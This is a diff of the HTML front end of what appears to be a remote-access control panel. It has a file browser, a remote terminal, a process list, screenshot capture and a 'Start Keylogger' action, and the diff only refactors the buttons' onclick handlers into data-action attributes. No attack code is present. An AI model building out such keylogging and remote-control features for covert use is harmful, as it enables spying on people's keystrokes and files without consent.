@@ -18,18 +18,18 @@
                 <span class="status-indicator online" id="statusIndicator"></span>
                 <span id="clientStatus">Loading...</span>
             </div>
-            <button class="close-btn" onclick="window.close()">Close</button>
+            <button class="close-btn" data-action="closeWindow">Close</button>
         </div>
     </div>
 
     <!-- TAB NAVIGATION -->
     <div class="tabs">
-        <button class="tab active" onclick="switchTab('overview')">📊 Overview</button>
-        <button class="tab" onclick="switchTab('files')">📁 File Browser</button>
-        <button class="tab" onclick="switchTab('terminal')">⌨️ Terminal</button>
-        <button class="tab" onclick="switchTab('processes')">⚙️ Processes</button>
-        <button class="tab" onclick="switchTab('info')">ℹ️ System Info</button>
-        <button class="tab" onclick="switchTab('actions')">⚡ Actions</button>
+        <button class="tab active" data-tab="overview">📊 Overview</button>
+        <button class="tab" data-tab="files">📁 File Browser</button>
+        <button class="tab" data-tab="terminal">⌨️ Terminal</button>
+        <button class="tab" data-tab="processes">⚙️ Processes</button>
+        <button class="tab" data-tab="info">ℹ️ System Info</button>
+        <button class="tab" data-tab="actions">⚡ Actions</button>
     </div>
 
     <!-- CONTENT AREA -->
@@ -107,15 +107,15 @@
             <div class="file-container">
                 <div class="toolbar">
                     <input type="text" class="path-input" id="filePath" placeholder="Enter file path...">
-                    <button class="btn btn-primary btn-small" onclick="browseFolder()">Browse</button>
-                    <button class="btn btn-secondary btn-small" id="drivesBtn" style="display: none;" onclick="toggleDrives()">💾 Drives</button>
-                    <button class="btn btn-secondary btn-small" onclick="uploadFile()">📤 Upload</button>
-                    <button class="btn btn-secondary btn-small" onclick="refreshFiles()">🔄 Refresh</button>
+                    <button class="btn btn-primary btn-small" data-action="browseFolder">Browse</button>
+                    <button class="btn btn-secondary btn-small" id="drivesBtn" style="display: none;" data-action="toggleDrives">💾 Drives</button>
+                    <button class="btn btn-secondary btn-small" data-action="uploadFile">📤 Upload</button>
+                    <button class="btn btn-secondary btn-small" data-action="refreshFiles">🔄 Refresh</button>
                 </div>
                 <div id="drivesPanel" style="display: none; background: #10121a; border: 1px solid #1f2230; border-radius: 10px; padding: 14px; margin-bottom: 14px;">
                     <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px;">
                         <h4 style="margin: 0; color: #fff;">Available Drives</h4>
-                        <button class="btn btn-secondary btn-small" onclick="toggleDrives()">Close</button>
+                        <button class="btn btn-secondary btn-small" data-action="toggleDrives">Close</button>
                     </div>
                     <div id="drivesList" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 10px;">
                         <div style="text-align: center; padding: 12px; color: var(--text-light);">Loading drives...</div>
@@ -143,9 +143,9 @@
         <div class="tab-content" id="terminal">
             <div class="terminal">
                 <div class="terminal-controls" style="background: var(--terminal-bg); padding: 10px; border-bottom: 1px solid #3e3e42; display: flex; gap: 10px;">
-                    <button onclick="clearTerminal()" style="background: #0e639c; color: white; border: none; padding: 5px 12px; border-radius: 3px; cursor: pointer; font-size: 12px;">Clear</button>
-                    <button onclick="connectTerminal()" style="background: #28a745; color: white; border: none; padding: 5px 12px; border-radius: 3px; cursor: pointer; font-size: 12px;">Connect</button>
-                    <button onclick="disconnectTerminal()" style="background: #dc3545; color: white; border: none; padding: 5px 12px; border-radius: 3px; cursor: pointer; font-size: 12px;">Disconnect</button>
+                    <button data-action="clearTerminal" style="background: #0e639c; color: white; border: none; padding: 5px 12px; border-radius: 3px; cursor: pointer; font-size: 12px;">Clear</button>
+                    <button data-action="connectTerminal" style="background: #28a745; color: white; border: none; padding: 5px 12px; border-radius: 3px; cursor: pointer; font-size: 12px;">Connect</button>
+                    <button data-action="disconnectTerminal" style="background: #dc3545; color: white; border: none; padding: 5px 12px; border-radius: 3px; cursor: pointer; font-size: 12px;">Disconnect</button>
                     <span id="terminalStatus" style="color: #888; font-size: 12px; align-self: center; margin-left: auto;">Not connected</span>
                 </div>
                 <div class="terminal-output" id="terminalOutput">
@@ -165,7 +165,7 @@
             <div class="processes-section">
                 <div class="toolbar">
                     <input type="text" placeholder="Search processes..." style="flex: 1;">
-                    <button class="btn btn-secondary btn-small" onclick="refreshProcesses()">🔄 Refresh</button>
+                    <button class="btn btn-secondary btn-small" data-action="refreshProcesses">🔄 Refresh</button>
                 </div>
                 <div class="process-list" id="processListContainer">
                     <div style="text-align: center; padding: 40px; color: var(--text-light);">
@@ -249,8 +249,8 @@
             <div class="actions-section">
                 <h3 style="margin-bottom: 20px;">Quick Actions</h3>
                 <div class="actions-grid">
-                    <button class="action-btn btn-primary" onclick="executeAction('screenshot')">📸 Screenshot</button>
-                    <button class="action-btn btn-secondary" id="keyloggerBtn" onclick="executeAction('keylogger')">⌨️ Start Keylogger</button>
+                    <button class="action-btn btn-primary" data-action="executeAction" data-action-name="screenshot">📸 Screenshot</button>
+                    <button class="action-btn btn-secondary" id="keyloggerBtn" data-action="executeAction" data-action-name="keylogger">⌨️ Start Keylogger</button>
                 </div>
                 
                 <!-- Keylogger Status -->
@@ -277,7 +277,7 @@
             <h3 id="modalTitle">Status</h3>
             <p id="modalMessage"></p>
             <div class="modal-actions">
-                <button class="btn btn-primary" onclick="closeModal()">OK</button>
+                <button class="btn btn-primary" data-action="closeModal">OK</button>
             </div>
         </div>
     </div>
